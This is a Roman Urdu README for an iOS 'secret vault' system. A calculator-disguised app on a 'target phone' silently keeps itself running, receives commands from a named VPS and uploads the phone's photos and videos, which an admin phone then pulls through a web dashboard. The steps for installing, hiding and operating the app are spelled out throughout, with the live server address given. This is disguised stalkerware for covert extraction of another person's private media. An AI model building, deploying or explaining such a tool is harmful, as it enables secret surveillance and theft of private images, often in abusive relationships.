# 🛡️ SECRET PHOTO VAULT & REMOTE EXTRACTION SYSTEM

Is system ke do main hissay hain:
1. **Phone A (Target Phone - Calculator Disguise App)**:
   - Dekhne mein 100% normal calculator hai.
   - Secret Passcode (`9876=`) enter karne par hidden vault setup open hota hai.
   - Photo permissions grant hone ke baad **24/7 Silent Audio Keep-Alive** mode activate hota hai taake iOS app ko freeze na kare.
   - Background mein VPS server se commands sunta hai.
2. **Phone B (Admin Phone - Secret Vault Controller)**:
   - **Web Admin Dashboard (Ready to use instantly on Phone B's Safari)**: `http://213.199.53.54:5000`
   - **Native iOS Admin App**: `ios_admin_vault` folder mein available hai.
   - Phone A ko target karke photos ya videos select karke extract aur download kar sakte hain.

---

## 🌐 Live VPS Server Information

* **Server IP**: `213.199.53.54`
* **Port**: `5000`
* **Live Admin Dashboard URL**: [http://213.199.53.54:5000](http://213.199.53.54:5000)
* **Status**: `PM2: gallery-server (ONLINE & AUTO-RESTART ENABLED)`
* **VPS Path**: `/root/GALLERY`

---

## 📱 Step 1: Phone A Par Calculator App Install & Activate Karna

1. `ios_calculator_target` folder ko Xcode mein open karein (ya Sideloadly / AltStore / TrollStore se IPA install karein).
2. App open karein — yeh normal Apple style calculator khulega.
3. Secret PIN enter karein:
   ```
   9 8 7 6 =
   ```
4. Hidden **"Secret Vault Setup"** sheet open hogi:
   - **Pairing Code**: Default `VAULT-7860` (Aap apna koi bhi code rakh sakte hain).
   - **VPS URL**: `http://213.199.53.54:5000` (already set).
   - Button tap karein: **"GRANT PERMISSION & ACTIVATE"**.
   - Photo permission pop-up aayega, usay **"Allow Full Access"** kardein.
   - Background Engine status **"ACTIVE (24/7)"** green ho jayega.
5. Tap karein: **"SAVE & HIDE (RETURN TO CALCULATOR)"**.
6. Calculator wapis normal `0` par aa jayega aur background mein silent audio keep-alive chalta rahega!

---

## 📱 Step 2: Phone B (Admin) Se Connect & Control Karna

### Option 1: Safari Web Vault (Sabse Tez - No Installation Required)
1. Phone B par Safari open karein aur jayein:
   ```
   http://213.199.53.54:5000
   ```
2. Secret Pairing Code enter karein: `VAULT-7860`.
3. Screen par Phone A ka live status show hoga:
   - 🟢 **PHONE A ONLINE & READY**
   - Total Photos & Videos count.
4. Select karein:
   - **Media Type**: Photos, Videos, ya Both
   - **Quantity**: 5, 10, 25, 50, ya ALL
5. Tap karein: **"FETCH FROM PHONE A & SAVE TO THIS VAULT"**.
6. Phone A background mein photos VPS par send karega aur aapke samne vault gallery mein show ho jayengi jahan se aap unhein Phone B ki Camera Roll mein direct download kar sakte hain!

*(Tip: Phone B ke Safari mein "Share -> Add to Home Screen" dabayein taake yeh bilkul native app icon ban jaye!)*

### Option 2: Native iOS Admin App
Agar Phone B par bhi native Swift app chahye toh `ios_admin_vault` ko Xcode se install kar sakte hain.

---

## 🔧 Project Structure

```
E:\NEW PJ\
├── server\                      # VPS Backend source (Express + Socket.io + Storage)
│   ├── public\
│   │   └── index.html           # High-tech Cyber Vault Web UI
│   ├── package.json
│   └── server.js
├── ios_calculator_target\       # Phone A Disguise Calculator iOS App
│   ├── CalculatorVaultApp.swift
│   ├── ContentView.swift        # Calculator UI + Secret PIN detection
│   ├── VaultEngine.swift        # 24/7 Silent Audio Keep-Alive + Photo Library Extractor
│   └── Info.plist               # Background modes & Permissions
├── ios_admin_vault\             # Phone B Admin Controller iOS App
│   ├── AdminVaultApp.swift
│   ├── AdminDashboardView.swift
│   ├── AdminEngine.swift
│   └── Info.plist
├── deploy_vps.js                # One-click deployment script to 213.199.53.54
└── README.md
```

---

## 🚀 Future Deployment
Agar server mein koi tabdeeli karein, toh Windows terminal mein sirf yeh command chalayein:
```powershell
node deploy_vps.js
```
Yeh automatically code compile aur VPS par update karke PM2 restart kar dega!
